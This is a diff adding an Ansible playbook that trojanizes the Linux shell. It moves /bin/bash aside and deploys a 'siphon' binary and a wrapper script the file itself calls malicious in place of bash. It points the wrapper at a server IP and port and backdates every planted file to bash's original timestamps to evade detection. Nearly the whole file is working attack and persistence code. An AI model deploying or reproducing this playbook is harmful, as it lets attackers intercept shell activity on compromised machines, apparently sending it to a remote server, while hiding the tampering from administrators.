@@ -1,0 +1,79 @@
+---
+- name: Gather system facts. Needed for OS architecture
+      ansible.builtin.setup:
+
+- name: Define variables for paths and filenames
+  set_fact:
+    file_to_replace: "/bin/bash"
+    file_new_path: "/bin/ash"
+    siphon_path: "/bin/siphon0"
+    server_ip: "192.168.1.1"
+    server_port: "80"
+
+- name: Get original timestamps of {{ file_to_replace }}
+  command: stat -c "%y %z" {{ file_to_replace }}
+  register: bash_timestamps
+  changed_when: false
+
+# TODO: prepend with . to hide 
+- name: Move {{ file_to_replace }} to {{ file_new_path }}
+  command: mv {{ file_to_replace }} {{ file_new_path }}
+  args:
+    creates: {{ file_new_path }}
+
+- name: Copy siphon based on architecture
+  copy:
+    src: "files/siphon-linux-{{ ansible_architecture }}"
+    dest: "{{ siphon_path }}"
+    owner: root
+    group: root
+    mode: '0755'
+  when: ansible_architecture in ['x86_64', 'i386', 'armv7l', 'aarch64']
+
+- name: Handle architecture-specific siphon versions
+  debug:
+    msg: "Selected siphon version: files/siphon-linux-{{ ansible_architecture }}"
+
+- name: Copy malicious wrapper script to {{ file_to_replace }}
+  copy:
+    src: files/bash_wrapper.sh
+    dest: {{ file_to_replace }}
+    owner: root
+    group: root
+    mode: '0755'
+
+- name: Replace bash path in the script
+  ansible.builtin.replace:
+    path: {{ file_to_replace }}
+    regexp: '/bin/ash'
+    replace: '{{ file_new_path }}'
+
+- name: Replace siphon path in the script
+  ansible.builtin.replace:
+    path: {{ file_to_replace }}
+    regexp: '/bin/siphon0'
+    replace: '{{ siphon_path  }}'
+
+- name: Replace server IP and port in the script
+  ansible.builtin.replace:
+    path: {{ file_to_replace }}
+    regexp: 'SERVER_IP'
+    replace: '{{ server_ip }}'
+
+- name: Replace server IP and port in the script
+  ansible.builtin.replace:
+    path: {{ file_to_replace }}
+    regexp: 'PORT'
+    replace: '{{ server_port }}'
+
+- name: Apply original timestamps to wrapper
+  command: >
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ file_new_path }}
+
+- name: Apply original timestamps to new {{ file_to_replace }}
+  command: >
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ file_to_replace }}
+
+- name: Apply original timestamps to siphon
+  command: >
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ siphon_path }}
